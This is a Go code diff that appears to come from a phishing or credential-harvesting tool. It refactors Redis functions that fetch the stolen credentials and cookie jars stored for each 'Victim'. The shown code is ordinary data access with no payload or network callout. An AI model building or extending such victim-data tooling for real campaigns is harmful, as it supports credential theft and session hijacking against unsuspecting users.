@@ -22,9 +22,6 @@ type Victim struct {
 	CredsCount          int    `redis:"creds_count"`
 	CookieJar           string `redis:"cookiejar_id"`
 	SessionInstrumented bool   `redis:"session_instrumented"`
-
-	Cookies     []VictimCookie     `redis:"-"`
-	Credentials []VictimCredential `redis:"-"`
 }
 
 // VictimCredential: a set of credentials associated to a Victim
@@ -181,98 +178,74 @@ func GetVictim(victimID string) (*Victim, error) {
 		return nil, err
 	}
 
-	// TODO: Review the autopopulate below, it might be a bullshit because it stress out the Redis.
-
-	// Populate Credentials
-	err = v.GetCredentials()
-	if err != nil {
-		return nil, err
-	}
-
-	// Populate Cookies
-	err = v.GetVictimCookiejar()
-	if err != nil {
-		return nil, err
-	}
-
 	return &v, nil
 }
 
-// GetCredentials retrieves the credentials of a Victims stored in the database.
-// This function populates the Victim.Credentials property.
+// GetCredentials returns a slice of VictimCredential belonging to a Victim.
 //
 // Redis commands:
 // HGETALL victim:Victim.ID:creds:...
-//
-// FIXME: Consider to rename this method to a more semantic one
-func (v *Victim) GetCredentials() error {
+func (v *Victim) GetCredentials() ([]VictimCredential, error) {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
 
-	v.Credentials = []VictimCredential{}
-	//cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:creds:*", v.ID)))
-	cKeys, err := ScanAll(fmt.Sprintf("victim:%s:creds:*", v.ID))
-	if err != nil {
-		return err
-	}
+	var credentials []VictimCredential
 
-	for _, k := range cKeys {
-		creds, err := redis.Values(rc.Do("HGETALL", k))
+	for i := 0; i < v.CredsCount; i++ {
+		key := fmt.Sprintf("victim:%s:creds:%d", v.ID, i)
+		creds, err := redis.Values(rc.Do("HGETALL", key))
 		if err != nil {
 			log.Error("%v", err)
 			continue
 		}
 
 		var vc VictimCredential
-		err = redis.ScanStruct(creds, &vc)
-		if err != nil {
+		if err = redis.ScanStruct(creds, &vc); err != nil {
 			log.Error("%v", err)
 			continue
 		}
 
-		v.Credentials = append(v.Credentials, vc)
+		credentials = append(credentials, vc)
 	}
 
-	return nil
+	return credentials, nil
 }
 
-// GetVictimCookiejar retrieves the Cookie jar of a Victims stored in the database.
-// This function populates the Victim.Cookies property.
+// GetCookieJar returns a slice of VictimCookie belonging to a Victim.
 //
 // Redis commands:
-// HGETALL victim:Victim.ID:creds:...
-//
-// FIXME: Consider to rename this method to a more semantic one
-func (v *Victim) GetVictimCookiejar() error {
+// HGETALL victim:Victim.ID:cookiejar:*
+func (v *Victim) GetCookieJar() ([]VictimCookie, error) {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
 
-	v.Cookies = []VictimCookie{}
-
-	//	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:cookiejar:*", v.ID)))
-	cKeys, err := ScanAll(fmt.Sprintf("victim:%s:cookiejar:*", v.ID))
+	key := fmt.Sprintf("victim:%s:cookiejar_entries", v.ID)
+	values, err := redis.Strings(rc.Do("LRANGE", key, "0", "-1"))
 	if err != nil {
-		return err
+		return nil, err
 	}
 
-	for _, k := range cKeys {
-		cookies, err := redis.Values(rc.Do("HGETALL", k))
+	var cookiejar []VictimCookie
+	for _, name := range values {
+		var cookie VictimCookie
+
+		key = fmt.Sprintf("victim:%s:cookiejar:%s", v.ID, name)
+		value, err := redis.Values(rc.Do("HGETALL", key))
 		if err != nil {
 			log.Error("%v", err)
 			continue
 		}
 
-		var vc VictimCookie
-		err = redis.ScanStruct(cookies, &vc)
+		err = redis.ScanStruct(value, &cookie)
 		if err != nil {
 			log.Error("%v", err)
 			continue
 		}
 
-		v.Cookies = append(v.Cookies, vc)
+		cookiejar = append(cookiejar, cookie)
 	}
 
-	return nil
+	return cookiejar, nil
 }
 
 // GetAllVictims fetches all the stored Victim(s) in the database
